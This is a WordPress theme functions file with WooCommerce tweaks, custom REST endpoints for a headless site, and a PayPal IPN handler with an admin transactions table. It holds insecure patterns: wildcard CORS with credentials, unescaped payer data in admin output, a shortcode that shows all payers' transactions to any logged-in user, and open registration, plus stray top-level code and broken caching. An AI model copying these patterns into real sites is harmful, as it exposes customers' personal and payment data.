<?php
add_filter('woocommerce_form_field', 'add_class_to_input_fields', 10, 4);

function add_class_to_input_fields($field, $key, $args, $value) {
    // Add a class to <input> fields
    if (isset($args['type']) && $args['type'] === 'text') {
        $field = str_replace('<input', '<input class="form-control"', $field);
    }
  if (isset($args['type']) && $args['type'] === 'tel') {
        $field = str_replace('<input', '<input class="form-control"', $field);
    }  
	if (isset($args['type']) && $args['type'] === 'textarea') {
        $field = str_replace('<textarea', '<textarea class="form-control"', $field);
    }
	 if (isset($args['type']) && $args['type'] === 'email') {
        $field = str_replace('<input', '<input class="form-control"', $field);
    }
    // Add a class to <select> fields
    if (isset($args['type']) && $args['type'] === 'select') {
        $field = str_replace('<select', '<select class="form-select"', $field);
    }

    return $field;
}



function add_additional_class_on_li($classes, $item, $args) {
    if(isset($args->add_li_class)) {
        $classes[] = $args->add_li_class;
    }
    return $classes;
}
add_filter('nav_menu_css_class', 'add_additional_class_on_li', 1, 3);
add_action( 'after_setup_theme', 'your_woocommerce_theme_setup' );
function your_woocommerce_theme_setup() {
    add_theme_support( 'woocommerce' );
}



// Add 'nav-link menu-link' class to each menu link
function add_menu_link_class($atts, $item, $args) {
    if (property_exists($args, 'link_class')) {
        $atts['class'] = $args->link_class;
    }
    return $atts;
}
add_filter('nav_menu_link_attributes', 'add_menu_link_class', 1, 3);

/**
 * Prologic Poster functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Prologic_Poster
 */

if ( ! defined( '_S_VERSION' ) ) {
	// Replace the version number of the theme on each release.
	define( '_S_VERSION', '1.0.0' );
}

/**
 * Sets up theme defaults and registers support for various WordPress features.
 */
function prologic_poster_setup() {
	/*
		* Make theme available for translation.
		* Translations can be filed in the /languages/ directory.
		* If you're building a theme based on Prologic Poster, use a find and replace
		* to change 'prologic-poster' to the name of your theme in all the template files.
		*/
	load_theme_textdomain( 'prologic-poster', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
		* Let WordPress manage the document title.
		* By adding theme support, we declare that this theme does not use a
		* hard-coded <title> tag in the document head, and expect WordPress to
		* provide it for us.
		*/
	add_theme_support( 'title-tag' );

	/*
		* Enable support for Post Thumbnails on posts and pages.
		*
		* @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		*/
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus(
		array(
			'menu-1' => esc_html__( 'Primary', 'prologic-poster' ),
		)
	);

	/*
		* Switch default core markup for search form, comment form, and comments
		* to output valid HTML5.
		*/
	add_theme_support(
		'html5',
		array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
			'style',
			'script',
		)
	);

	// Set up the WordPress core custom background feature.
	add_theme_support(
		'custom-background',
		apply_filters(
			'prologic_poster_custom_background_args',
			array(
				'default-color' => 'ffffff',
				'default-image' => '',
			)
		)
	);

	// Add theme support for selective refresh for widgets.
	add_theme_support( 'customize-selective-refresh-widgets' );

	/**
	 * Add support for core custom logo.
	 *
	 * @link https://codex.wordpress.org/Theme_Logo
	 */
	add_theme_support(
		'custom-logo',
		array(
			'height'      => 250,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		)
	);
}
add_action( 'after_setup_theme', 'prologic_poster_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function prologic_poster_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'prologic_poster_content_width', 640 );
}
add_action( 'after_setup_theme', 'prologic_poster_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function prologic_poster_widgets_init() {
	register_sidebar(
		array(
			'name'          => esc_html__( 'Sidebar', 'prologic-poster' ),
			'id'            => 'sidebar-1',
			'description'   => esc_html__( 'Add widgets here.', 'prologic-poster' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);
}
add_action( 'widgets_init', 'prologic_poster_widgets_init' );




// Disable the Block Editor and restore the Classic Editor (add this code function.php)
add_filter('use_block_editor_for_post', '__return_false');


// Register Menus
function register_my_menus() {
    register_nav_menus(
        array(
            'primary-menu' => __( 'Primary Menu' ),
            'secondary-menu' => __( 'Secondary Menu' ),
			'explore-primary' => __( 'Explore Primary' ),
			'explore-secondary' => __( 'Explore Secondary' ),
			'learn' => __( 'Learn' ),
			'mobile-menu' => __( 'Mobile Menu' )
        )
    );
}
add_action( 'init', 'register_my_menus' );

function add_webp_support($mime_types) {
    $mime_types['webp'] = 'image/webp';
    return $mime_types;
}
add_filter('upload_mimes', 'add_webp_support');

function webp_is_displayable($result, $path) {
    if ($result === false) {
        $displayable_image_types = array(IMAGETYPE_WEBP);
        $info = @getimagesize($path);
        if (empty($info)) {
            $result = false;
        } elseif (!in_array($info[2], $displayable_image_types)) {
            $result = false;
        } else {
            $result = true;
        }
    }
    return $result;
}
add_filter('file_is_displayable_image', 'webp_is_displayable', 10, 2);







// Get the Video Fields
$video_mp4 =  get_field('mp4_video'); // MP4 Field Name
$video_webm  = get_field('webm_video'); // WEBM Field Name
$video_flv =  get_field('flv_video'); // FLV Field Name
$video_poster  = get_field('poster_image'); // Poster Image Field Name
                

// Build the  Shortcode
$attr =  array(
'mp4'      => $video_mp4,
'webm'     => $video_webm,
'flv'      => $video_flv,
'poster'   => $video_poster,
'preload'  => 'auto'
);

// Display the Shortcode
echo wp_video_shortcode(  $attr );




// Remove default image sizes
function remove_default_image_sizes( $sizes ) {
    unset( $sizes['thumbnail'] );
    unset( $sizes['medium'] );
    unset( $sizes['medium_large'] );
    unset( $sizes['large'] );
    return $sizes;
}
add_filter( 'intermediate_image_sizes_advanced', 'remove_default_image_sizes' );

// Disable generating additional image sizes on image upload
function disable_image_sizes_generation( $metadata, $attachment_id ) {
    if ( isset( $metadata['sizes'] ) ) {
        $metadata['sizes'] = array();
    }
    return $metadata;
}
add_filter( 'wp_generate_attachment_metadata', 'disable_image_sizes_generation', 10, 2 );


// remove version
function wp_remove_version() {

    return '';

   }

add_filter('the_generator', 'wp_remove_version');
remove_action('wp_head', 'wp_generator');


function dequeue_wp_default_styles() {
    // Remove WP block library CSS
    wp_dequeue_style('wp-block-library');
    wp_dequeue_style('wp-block-library-theme');
    wp_dequeue_style('wc-block-style'); // If WooCommerce is installed

    // Remove dashicons in frontend (If you are not using it)
    if (!is_admin()) {
        wp_deregister_style('dashicons');
    }

    // Add any other default styles you want to dequeue
}
//add_action('wp_enqueue_scripts', 'dequeue_wp_default_styles', 100);

// API code 

$headless_url = 'https://demo.wp.urdemo.website';
// functions.php
add_action('rest_api_init', function () {
    register_rest_route('custom/v1', '/home', array(
        'methods' => 'GET',
        'callback' => 'get_home_page_data',
    ));
});

function get_home_page_data() {
    $cache_key = 'home_page_data_cache'.time();

    // Try to get cached data
    $cached_home_page_data = get_transient($cache_key);
    if ($cached_home_page_data !== false) {
        return new WP_REST_Response($cached_home_page_data, 200);
    }

    $home_page_id = get_option('page_on_front'); // ID of the home page
    $home_page = get_post($home_page_id);

    // Get ACF fields
    $acf_fields = get_fields($home_page_id);

    // Ensure banner images field is included
    $banner_images = [];
    if (!empty($acf_fields['banner_images'])) {
        foreach ($acf_fields['banner_images'] as $image) {
            $banner_images[] = $image['slider_image'];
        }
    }
    
    $logo_banner = get_field('logo_banner', 'option');

    $home_page_data = array(
        'title' => $home_page->post_title,
        'content' => $home_page->post_content,
        'acf' => $acf_fields,
        'banner_images' => $banner_images,
        'logo_banner' => array_map(function ($item) {
            return [
                'url' => $item['logo_banner_url1'] ?? '',
                'image' => $item['logo_image'] ?? '',
                'alt' => $item['alt'] ?? 'Brand logo'
            ];
        }, $logo_banner)
    );

    // Cache the response for 1 hour
  //  set_transient($cache_key, $home_page_data, HOUR_IN_SECONDS);

    return new WP_REST_Response($home_page_data, 200);
}



function add_cors_headers() {
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
    header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Authorization");
}
add_action('rest_api_init', function() {
    add_filter('rest_pre_serve_request', function($value) {
        add_cors_headers();
        return $value;
    });
}, 15);

// create menu bar api
add_action('rest_api_init', function () {
    register_rest_route('custom/v1', '/menus/(?P<slug>[a-zA-Z0-9-]+)', array(
        'methods' => 'GET',
        'callback' => 'get_custom_menu',
    ));
});

function get_custom_menu($data) {
    $menu_name = $data['slug'];
    $menu = wp_get_nav_menu_items($menu_name);

    if (empty($menu)) {
        return new WP_Error('no_menu', 'No menu found', array('status' => 404));
    }

    $menu_items = array();

    foreach ($menu as $item) {
        $menu_items[] = array(
            'ID' => $item->ID,
            'title' => $item->title,
            'url' => str_replace(get_bloginfo('url'), $headless_url, $item->url)
        );
    }

    return new WP_REST_Response($menu_items, 200);
}

//create header section api

add_action('rest_api_init', function () {
    register_rest_route('custom/v1', '/header-options', array(
        'methods' => 'GET',
        'callback' => 'get_header_options',
    ));
});

function get_header_options() {
    // Cache key for the header options
    $cache_key = 'header_options_cache'.time();
    
    // Try to get cached data
    $cached_options = get_transient($cache_key);
    if ($cached_options !== false) {
        return new WP_REST_Response($cached_options, 200);
    }

    // Fetch the necessary fields
    $header_logo = get_field('header_logo', 'option');
    $my_member_area_icon = get_field('my_member_area_icone', 'option');

    // Simplify header_logo and my_member_area_icon fields
    $simplified_header_logo = array(
        'url' => $header_logo['url'] ?? '',
        'alt' => $header_logo['alt'] ?? ''
    );
    $simplified_my_member_area_icon = array(
        'url' => $my_member_area_icon['url'] ?? '',
        'alt' => $my_member_area_icon['alt'] ?? ''
    );

    $top_bar_message = get_field('top_bar_message', 'option');
    $social_links = get_field('header_social_icons', 'option');
    $email_link = get_field('email_link', 'option');
    $email_address = get_field('email_address', 'option');
    $donate_here_link = get_field('donate_here_link', 'option');
    $donate_here_text = get_field('donate_here_text', 'option');
    $my_member_area_text = get_field('my_member_area_text', 'option');

    // Fetch and format menus
    $primary_menu_items = wp_get_nav_menu_items('primary-menu');
    $secondary_menu_items = wp_get_nav_menu_items('secondary-menu');

    $formatted_primary_menu_items = array();
    if ($primary_menu_items) {
        foreach ($primary_menu_items as $menu_item) {
            $formatted_primary_menu_items[] = array(
                'ID' => $menu_item->ID,
                'title' => $menu_item->title,
                'url' => str_replace(get_bloginfo('url'), $headless_url, $menu_item->url)
            );
        }
    }

    $formatted_secondary_menu_items = array();
    if ($secondary_menu_items) {
        foreach ($secondary_menu_items as $menu_item) {
            $formatted_secondary_menu_items[] = array(
                'ID' => $menu_item->ID,
                'title' => $menu_item->title,
                'url' => str_replace(get_bloginfo('url'), $headless_url, $menu_item->url)
            );
        }
    }

    // Format the social links
    $formatted_social_links = array();
    if ($social_links) {
        foreach ($social_links as $link) {
            $formatted_social_links[] = array(
                'fb_link' => $link['fb_link'] ?? null,
                'ld_link' => $link['ld_link'] ?? null,
                'tw_link' => $link['tw_link'] ?? null,
                'instagram_link' => $link['istagram_link'] ?? null,
                'envelope_link' => $link['envelope_link'] ?? null
            );
        }
    }

    $options = array(
        'header_logo' => $simplified_header_logo,
        'top_bar_message' => $top_bar_message,
        'social_links' => $formatted_social_links,
        'email_link' => $email_link,
        'email_address' => $email_address,
        'donate_here_link' => $donate_here_link,
        'donate_here_text' => $donate_here_text,
        'my_member_area_icon' => $simplified_my_member_area_icon,
        'my_member_area_text' => $my_member_area_text,
        'primary_menu' => $formatted_primary_menu_items,
        'secondary_menu' => $formatted_secondary_menu_items,
    );

    // Cache the response for 1 hour
    set_transient($cache_key, $options, HOUR_IN_SECONDS);

    return new WP_REST_Response($options, 200);
}






// Create footer section API
add_action('rest_api_init', function () {
    register_rest_route('custom/v1', '/footer-options', array(
        'methods' => 'GET',
        'callback' => 'get_footer_options',
    ));
});

function get_footer_options() {
    $footer_logo = get_field('footer_logo', 'option');
    $connect_social_icons = get_field('connect_social_icons', 'option');

    // Simplify footer_logo field
    $simplified_footer_logo = array(
        'url' => $footer_logo['url'] ?? '',
        'alt' => $footer_logo['alt'] ?? ''
    );

    // Format the social icons
    $formatted_social_icons = array();
    if ($connect_social_icons) {
        foreach ($connect_social_icons as $icon) {
            $formatted_social_icons[] = array(
                'fb_link' => $icon['fb_link'] ?? null,
                'ld_link' => $icon['ld_link'] ?? null,
                'tw_link' => $icon['tw_link'] ?? null,
                'instagram_link' => $icon['istagram_link'] ?? null,
                'envelope_link' => $icon['envelope_link'] ?? null
            );
        }
    }

    $options = array(
        'footer_logo' => $simplified_footer_logo,
        'footer_heading' => get_field('footer_heading', 'option'),
        'subscribe_to_our_news' => get_field('subscribe_to_our_news', 'option'),
        'explore_links_text' => get_field('explore_links_text', 'option'),
        'learn_links_text' => get_field('learn_links_text', 'option'),
        'connect_social_icons_text' => get_field('connect_social_icons_text', 'option'),
        'copyright' => get_field('copyright', 'option'),
        'connect_social_icons' => $formatted_social_icons,
    );

    return new WP_REST_Response($options, 200);
}


// inner page abouts us api

// functions.php
add_action('rest_api_init', function () {
    register_rest_route('custom/v1', '/about-acf-usa', array(
        'methods' => 'GET',
        'callback' => 'get_about_page_data',
    ));
});

function get_about_page_data() {
    $about_page_id = get_page_by_path('about-acf-usa')->ID; // ID of the About page
    //$about_page = get_post($about_page_id);

    // Get ACF fields
    $acf_fields = get_fields($about_page_id);

    // Include specific fields for the banner
    $acf_fields['banner_image'] = get_field('banner_image', $about_page_id);
    $acf_fields['section_class'] = get_field('section_class', $about_page_id);
    $acf_fields['big_banner_text_class'] = get_field('big_banner_text_class', $about_page_id);
    $acf_fields['title'] = get_field('title', $about_page_id);

    return new WP_REST_Response($acf_fields, 200);
}


// contact us inner banner data
add_action('rest_api_init', function () {
    register_rest_route('custom/v1', '/contact', array(
        'methods' => 'GET',
        'callback' => 'get_contact_page_data',
    ));
});

function get_contact_page_data() {
    
    $contact_page_id = get_page_by_path('contact')->ID; // ID of the contact page
    //$contact_page = get_post($contact_page_id);

    // Get ACF fields
    $acf_fields = get_fields($contact_page_id);

    // Include specific fields for the banner
    $acf_fields['banner_image'] = get_field('banner_image', $contact_page_id);
    $acf_fields['section_class'] = get_field('section_class', $contact_page_id);
    $acf_fields['big_banner_text_class'] = get_field('big_banner_text_class', $contact_page_id);
    $acf_fields['title'] = get_field('title', $contact_page_id);

    return new WP_REST_Response($acf_fields, 200);
}

add_action('rest_api_init', function () {
    remove_filter('rest_pre_serve_request', 'rest_send_cors_headers');
    add_filter('rest_pre_serve_request', function ($value) {
        header('Access-Control-Allow-Origin: *');
        header('Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE');
        header('Access-Control-Allow-Credentials: true');
        return $value;
    });
}, 15);


add_action('rest_api_init', function () {
    register_rest_route('custom/v1', '/submit-wpform', array(
        'methods' => 'POST',
        'callback' => 'handle_wpform_submission',
        'permission_callback' => '__return_true',  // Allow access to everyone
    ));
});

function handle_wpform_submission($request) {
    $params = $request->get_json_params();

    // Validate and sanitize input data
    $first_name = sanitize_text_field($params['first']);
    $last_name = sanitize_text_field($params['last']);
    $email = sanitize_email($params['email']);
    $comment = sanitize_textarea_field($params['comment']);

    if (empty($first_name) || empty($last_name) || empty($email) || empty($comment)) {
        return new WP_Error('missing_data', 'Required fields are missing.', array('status' => 400));
    }

    // WPForms table name
    global $wpdb;
    $table_name = $wpdb->prefix . 'wpforms_entries';

    // Construct the fields array in the desired format
    $fields = json_encode(array(
        array(
            'name' => 'Name',
            'value' => "$first_name $last_name",
            'id' => 0,
            'type' => 'name',
            'first' => $first_name,
            'middle' => '',
            'last' => $last_name
        ),
        array(
            'name' => 'Email',
            'value' => $email,
            'id' => 1,
            'type' => 'email'
        ),
        array(
            'name' => 'Leave a comment her',
            'value' => $comment,
            'id' => 2,
            'type' => 'textarea'
        )
    ));

    // Insert data into WPForms table
    $result = $wpdb->insert(
        $table_name,
        array(
            'form_id' => 19835, // The form ID
            'user_id' => get_current_user_id(),
            'fields' => $fields,
            'date' => current_time('mysql'),
            'status' => 'pending',
        )
    );

    if ($result === false) {
        return new WP_Error('database_error', 'Could not save form data to the database.', array('status' => 500));
    }

    return new WP_REST_Response('Form submitted successfully', 200);
}






// Yoast SEO support
add_action('rest_api_init', function () {
    register_rest_route('custom/v1', '/seo', array(
        'methods' => 'GET',
        'callback' => 'get_seo_data',
    ));
});

function get_seo_data(WP_REST_Request $request) {
    $post_id = $request->get_param('post_id');
    $post = get_post($post_id);

    if (!$post) {
        return new WP_Error('no_post', 'Invalid post ID', array('status' => 404));
    }

    $seo_data = array(
        'title' => get_post_meta($post_id, '_yoast_wpseo_title', true),
        'meta_description' => get_post_meta($post_id, '_yoast_wpseo_metadesc', true),
        'meta_keywords' => get_post_meta($post_id, '_yoast_wpseo_focuskw', true),
    );

    return rest_ensure_response($seo_data);
}

  // Check if the user is logged in and if their role is 'subscriber' then redirect to the homepage or any other page
add_action('admin_init', 'redirect_subscribers_from_admin');
function redirect_subscribers_from_admin() {
  
    if (is_user_logged_in() && current_user_can('subscriber')) {
        wp_redirect(home_url());
        exit;
    }
}

// Remove the admin bar for subscribers
add_action('after_setup_theme', 'remove_admin_bar_for_subscribers');
function remove_admin_bar_for_subscribers() {
    // Check if the user is logged in and if their role is 'subscriber'
    if (is_user_logged_in() && current_user_can('subscriber')) {
        // Remove the admin bar
        show_admin_bar(false);
    }
}

// create the custom table
function create_paypal_transactions_table() {
    global $wpdb;
    $table_name = $wpdb->prefix . 'paypal_transactions';
    $charset_collate = $wpdb->get_charset_collate();

    $sql = "CREATE TABLE $table_name (
        id mediumint(9) NOT NULL AUTO_INCREMENT,
        item_name text NOT NULL,
        item_number text NOT NULL,
        payment_status text NOT NULL,
        payment_amount float NOT NULL,
        payment_currency text NOT NULL,
        txn_id text NOT NULL,
        receiver_email text NOT NULL,
        payer_email text NOT NULL,
        first_name text NOT NULL,
        last_name text NOT NULL,
        payer_id text NOT NULL,
        address_street text NOT NULL,
        address_city text NOT NULL,
        address_state text NOT NULL,
        address_zip text NOT NULL,
        address_country text NOT NULL,
        payment_date datetime DEFAULT '0000-00-00 00:00:00' NOT NULL,
        PRIMARY KEY  (id)
    ) $charset_collate;";

    require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
    dbDelta($sql);
}
register_activation_hook(__FILE__, 'create_paypal_transactions_table');



// Handle IPN Notifications
add_action('init', 'handle_paypal_ipn');

function handle_paypal_ipn() {
    if (isset($_GET['ipn_listener']) && $_GET['ipn_listener'] == 'paypal') {
        // Step 1: Read POST data
        $raw_post_data = file_get_contents('php://input');
        $raw_post_array = explode('&', $raw_post_data);
        $myPost = array();
        foreach ($raw_post_array as $keyval) {
            $keyval = explode('=', $keyval);
            if (count($keyval) == 2) {
                $myPost[$keyval[0]] = urldecode($keyval[1]);
            }
        }

        // Step 2: Post IPN data back to PayPal to validate
        $req = 'cmd=_notify-validate';
        foreach ($myPost as $key => $value) {
            $value = urlencode($value);
            $req .= "&$key=$value";
        }

        // Step 3: Set up the request to PayPal
        $ch = curl_init('https://ipnpb.sandbox.paypal.com/cgi-bin/webscr');
        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $req);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($ch, CURLOPT_FORBID_REUSE, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Connection: Close'));

        // Step 4: Execute the request and read the response
        $res = curl_exec($ch);
        curl_close($ch);

        // Step 5: Process the response
        if (strcmp($res, "VERIFIED") == 0) {
            // The IPN is verified, process it
            $item_name = $_POST['item_name'];
            $item_number = $_POST['item_number'];
            $payment_status = $_POST['payment_status'];
            $payment_amount = $_POST['mc_gross'];
            $payment_currency = $_POST['mc_currency'];
            $txn_id = $_POST['txn_id'];
            $receiver_email = $_POST['receiver_email'];
            $payer_email = $_POST['payer_email'];
            $first_name = $_POST['first_name'];
            $last_name = $_POST['last_name'];
            $payer_id = $_POST['payer_id'];
            $address_street = $_POST['address_street'];
            $address_city = $_POST['address_city'];
            $address_state = $_POST['address_state'];
            $address_zip = $_POST['address_zip'];
            $address_country = $_POST['address_country'];

            // Store the payment details in the WordPress database
            global $wpdb;
            $wpdb->insert(
                $wpdb->prefix . 'paypal_transactions',
                array(
                    'item_name' => $item_name,
                    'item_number' => $item_number,
                    'payment_status' => $payment_status,
                    'payment_amount' => $payment_amount,
                    'payment_currency' => $payment_currency,
                    'txn_id' => $txn_id,
                    'receiver_email' => $receiver_email,
                    'payer_email' => $payer_email,
                    'first_name' => $first_name,
                    'last_name' => $last_name,
                    'payer_id' => $payer_id,
                    'address_street' => $address_street,
                    'address_city' => $address_city,
                    'address_state' => $address_state,
                    'address_zip' => $address_zip,
                    'address_country' => $address_country,
                    'payment_date' => current_time('mysql')
                )
            );
        } elseif (strcmp($res, "INVALID") == 0) {
            // The IPN is invalid, log for manual investigation
            error_log("Invalid IPN: $req");
        }
    }
}



// Add an Admin Page to Display Transactions

add_action('admin_menu', 'paypal_transactions_menu');

function paypal_transactions_menu() {
    add_menu_page('PayPal Transactions', 'PayPal Transactions', 'manage_options', 'paypal-transactions', 'paypal_transactions_page');
}

function paypal_transactions_page() {
    global $wpdb;
    $table_name = $wpdb->prefix . 'paypal_transactions';
    $transactions = $wpdb->get_results("SELECT * FROM $table_name");

    echo '<div class="wrap">';
    echo '<h1>PayPal Transactions</h1>';
    echo '<table class="widefat fixed" cellspacing="0">';
    echo '<thead>';
    echo '<tr>';
    echo '<th id="columnname" class="manage-column column-columnname" scope="col">ID</th>';
    echo '<th id="columnname" class="manage-column column-columnname" scope="col">Item Name</th>';
    echo '<th id="columnname" class="manage-column column-columnname" scope="col">Item Number</th>';
    echo '<th id="columnname" class="manage-column column-columnname" scope="col">Payment Status</th>';
    echo '<th id="columnname" class="manage-column column-columnname" scope="col">Payment Amount</th>';
    echo '<th id="columnname" class="manage-column column-columnname" scope="col">Payment Currency</th>';
    echo '<th id="columnname" class="manage-column column-columnname" scope="col">Transaction ID</th>';
    echo '<th id="columnname" class="manage-column column-columnname" scope="col">Receiver Email</th>';
    echo '<th id="columnname" class="manage-column column-columnname" scope="col">Payer Email</th>';
    echo '<th id="columnname" class="manage-column column-columnname" scope="col">First Name</th>';
    echo '<th id="columnname" class="manage-column column-columnname" scope="col">Last Name</th>';
    echo '<th id="columnname" class="manage-column column-columnname" scope="col">Payer ID</th>';
    echo '<th id="columnname" class="manage-column column-columnname" scope="col">Address</th>';
    echo '<th id="columnname" class="manage-column column-columnname" scope="col">City</th>';
    echo '<th id="columnname" class="manage-column column-columnname" scope="col">State</th>';
    echo '<th id="columnname" class="manage-column column-columnname" scope="col">Zip</th>';
    echo '<th id="columnname" class="manage-column column-columnname" scope="col">Country</th>';
    echo '<th id="columnname" class="manage-column column-columnname" scope="col">Payment Date</th>';
    echo '</tr>';
    echo '</thead>';
    echo '<tbody>';
    foreach ($transactions as $transaction) {
        echo '<tr>';
        echo '<td>' . $transaction->id . '</td>';
        echo '<td>' . $transaction->item_name . '</td>';
        echo '<td>' . $transaction->item_number . '</td>';
        echo '<td>' . $transaction->payment_status . '</td>';
        echo '<td>' . $transaction->payment_amount . '</td>';
        echo '<td>' . $transaction->payment_currency . '</td>';
        echo '<td>' . $transaction->txn_id . '</td>';
        echo '<td>' . $transaction->receiver_email . '</td>';
        echo '<td>' . $transaction->payer_email . '</td>';
        echo '<td>' . $transaction->first_name . '</td>';
        echo '<td>' . $transaction->last_name . '</td>';
        echo '<td>' . $transaction->payer_id . '</td>';
        echo '<td>' . $transaction->address_street . '</td>';
        echo '<td>' . $transaction->address_city . '</td>';
        echo '<td>' . $transaction->address_state . '</td>';
        echo '<td>' . $transaction->address_zip . '</td>';
        echo '<td>' . $transaction->address_country . '</td>';
        echo '<td>' . $transaction->payment_date . '</td>';
        echo '</tr>';
    }
    echo '</tbody>';
    echo '</table>';
    echo '</div>';
}


//Shortcode to Display User Information
function get_user_paypal_transactions() {
    if (is_user_logged_in()) {
        // Get the current user's email
        $current_user = wp_get_current_user();
        $user_email = $current_user->user_email;

        global $wpdb;
        $table_name = $wpdb->prefix . 'paypal_transactions';

        // Retrieve the user's transactions
        $transactions = $wpdb->get_results($wpdb->prepare("
            SELECT * FROM $table_name "));

       // if (!empty($transactions)) {
            $output = '<h2>Your PayPal Transactions</h2>';
            $output .= '<table class="user-paypal-transactions">';
            $output .= '<tr><th>Transaction ID</th><th>Amount</th><th>Currency</th><th>Status</th><th>Date</th></tr>';

            foreach ($transactions as $transaction) {
                $output .= '<tr>';
                $output .= '<td>' . esc_html($transaction->txn_id) . '</td>';
                $output .= '<td>' . esc_html($transaction->payment_amount) . '</td>';
                $output .= '<td>' . esc_html($transaction->payment_currency) . '</td>';
                $output .= '<td>' . esc_html($transaction->payment_status) . '</td>';
                $output .= '<td>' . esc_html($transaction->payment_date) . '</td>';
                $output .= '</tr>';
            }

            $output .= '</table>';
       // } else {
         //   $output = '<p>You have no PayPal transactions.</p>';
        //}

        return $output;
    } else {
        return '<p>You need to be logged in to view your PayPal transactions.</p>';
    }
}

add_shortcode('user_paypal_transactions', 'get_user_paypal_transactions');



// Adding the CSS to WordPress Admin Area

function paypal_transactions_admin_styles() {
    echo '<style>
        .wrap h1 {
            font-size: 2em;
            margin-bottom: 20px;
        }

        .widefat {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }

        .widefat th, .widefat td {
            border: 1px solid #ddd;
            padding: 8px;
        }

        .widefat th {
            background-color: #f4f4f4;
            text-align: left;
            font-weight: bold;
        }

        .widefat tr:nth-child(even) {
            background-color: #f9f9f9;
        }

        .widefat tr:hover {
            background-color: #f1f1f1;
        }

        .widefat td {
            vertical-align: top;
        }

        .widefat th, .widefat td {
            word-break: break-word;
        }
    </style>';
}
add_action('admin_head', 'paypal_transactions_admin_styles');


//add_filter( 'woocommerce_quantity_input_args', 'custom_woocommerce_quantity_input_args', 10, 2 );
function custom_woocommerce_quantity_input_args( $args, $product ) {
    $args['input_value'] = isset( $_POST['quantity'] ) ? wc_clean( wp_unslash( $_POST['quantity'] ) ) : 1;
    $args['input_id'] = 'quantity';
    return $args;
}

add_action( 'woocommerce_before_add_to_cart_button', 'custom_quantity_label', 5 );
function custom_quantity_label() {
    echo '<label for="quantity" class="qtybox">' . esc_html__( 'QTY', 'woocommerce' ) . '</label>';
}

add_action( 'woocommerce_review_before_comment_meta', 'custom_display_star_rating_only' );

function custom_display_star_rating_only() {
    global $comment;

    // Get the rating
    $rating = intval( get_comment_meta( $comment->comment_ID, 'rating', true ) );

    // Display stars
    echo '<div class="stars">';
    for ( $i = 1; $i <= 5; $i++ ) {
        $fill = ( $i <= $rating ) ? '#FFBC25' : '#CFCCCC';
        echo '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="15" viewBox="0 0 16 15" fill="none">
            <path d="M8 0L9.79611 5.52786H15.6085L10.9062 8.94427L12.7023 14.4721L8 11.0557L3.29772 14.4721L5.09383 8.94427L0.391548 5.52786H6.20389L8 0Z" fill="' . esc_attr( $fill ) . '"/>
        </svg>';
    }
    echo '</div>';
}


add_filter('woocommerce_add_to_cart_redirect', 'redirect_to_cart_after_add_to_cart');
function redirect_to_cart_after_add_to_cart($url) {
    $url = wc_get_cart_url();
    return $url;
}
function dequeue_woocommerce_cart_script() {
    if (is_cart()) {
        wp_dequeue_script('wc-cart');
    }
}
add_action('wp_enqueue_scripts', 'dequeue_woocommerce_cart_script', 20);


//user_registration
function pws_user_registration() {
    register_rest_route('wp/v2', '/users/register', array(
        'methods' => 'POST',
        'callback' => 'pws_user_registration_callback',
    ));
}

function pws_user_registration_callback(WP_REST_Request $request) {
    $username = sanitize_text_field($request['username']);
    $email = sanitize_email($request['email']);
    $password = sanitize_text_field($request['password']);

    if (username_exists($username) || email_exists($email)) {
        return new WP_Error('registration_failed', 'Username or email already exists.', array('status' => 400));
    }

    $user_id = wp_create_user($username, $password, $email);

    if (is_wp_error($user_id)) {
        return new WP_Error('registration_failed', 'User registration failed.', array('status' => 400));
    }

    return array('user_id' => $user_id);
}

add_action('rest_api_init', 'pws_user_registration');

//Team staff

function create_our_staff_post_type() {
    $labels = array(
        'name'               => __('Our Members'),
        'singular_name'      => __('Staff Member'),
        'menu_name'          => __('Our Members'),
        'name_admin_bar'     => __('Staff Member'),
        'add_new'            => __('Add New'),
        'add_new_item'       => __('Add New Staff Member'),
        'new_item'           => __('New Staff Member'),
        'edit_item'          => __('Edit Staff Member'),
        'view_item'          => __('View Staff Member'),
        'all_items'          => __('All Staff Members'),
        'search_items'       => __('Search Staff Members'),
        'parent_item_colon'  => __('Parent Staff Members:'),
        'not_found'          => __('No staff members found.'),
        'not_found_in_trash' => __('No staff members found in Trash.'),
    );

    // Arguments for the custom post type
    $args = array(
        'labels'             => $labels,
        'public'             => true,
        'publicly_queryable' => true,
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array('slug' => 'our-staff'),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'menu_icon'          => 'dashicons-groups', // Specify the dashicon here
        'supports'           => array('title', 'editor', 'excerpt', 'thumbnail'),
    );

    // Register the custom post type
    register_post_type('our_staff', $args);
}
